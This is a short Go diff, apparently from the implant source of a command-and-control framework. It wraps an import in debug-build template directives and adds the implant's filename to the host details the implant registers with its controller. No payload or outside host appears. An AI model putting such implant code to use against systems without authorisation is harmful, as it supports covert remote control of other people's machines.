@@ -8,7 +8,11 @@ import (
 	"flag"
 	"fmt"
 	"io"
+
+	// {{if .Debug}}
+	// {{else}}
 	"io/ioutil"
+	// {{end}}
 
 	"log"
 	"os"
@@ -117,6 +121,7 @@ func registerSliver(conn *tls.Conn) {
 		Os:       runtime.GOOS,
 		Arch:     runtime.GOARCH,
 		Pid:      int32(os.Getpid()),
+		Filename: os.Args[0],
 	})
 	envelope := pb.Envelope{
 		Type: pb.MsgRegister,
